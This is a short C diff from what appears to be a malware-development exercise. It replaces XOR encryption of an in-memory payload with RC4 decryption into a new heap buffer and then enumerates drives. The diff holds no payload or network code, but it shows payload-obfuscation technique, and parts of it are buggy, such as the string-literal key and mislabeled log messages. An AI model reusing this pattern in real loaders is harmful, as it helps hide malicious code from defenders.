@@ -10,14 +10,26 @@ int main(void)
 	LPPAYLOAD pPayload = Test();
 	
 	if (pPayload == NULL) return -5;
+
 	
-	wprintf(L"[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Encrypting Payload...\n", pPayload->pPayloadAddress, pPayload->pPayloadAddress);
-	BYTE *pbKey[4] = {0xEFBEADDE};
-
-	XorByInputKey(pPayload->pPayloadAddress, *pPayload->dwpPayloadSize, &pbKey, 4);
 
 	wprintf(L"[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Encrypting Payload...\n", pPayload->pPayloadAddress, pPayload->pPayloadAddress);
 
+	unsigned char *pKey = "0xdeadbeef";
+
+	unsigned char *pDecryptedPayload = malloc(pPayload->dwPayloadSize);
+
+	wprintf(L"[i] dwPayloadSize var : %lu \n", pPayload->dwPayloadSize);
+
+	RC4CONTEXT Context = { 0 };
+
+	RC4Init(&Context, pKey, strlen(pKey));
+
+	RC4Encrypt(&Context, (unsigned char *)pPayload->pPayloadAddress, pDecryptedPayload, pPayload->dwPayloadSize);
+
+	pPayload->pPayloadAddress = pDecryptedPayload;
+
+	wprintf(L"[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Encrypting Payload...\n",pDecryptedPayload, pDecryptedPayload);
 	WCHAR pPath[MAX_PATH] = { L'\0' };
 
 	FetchDrives(pPath);
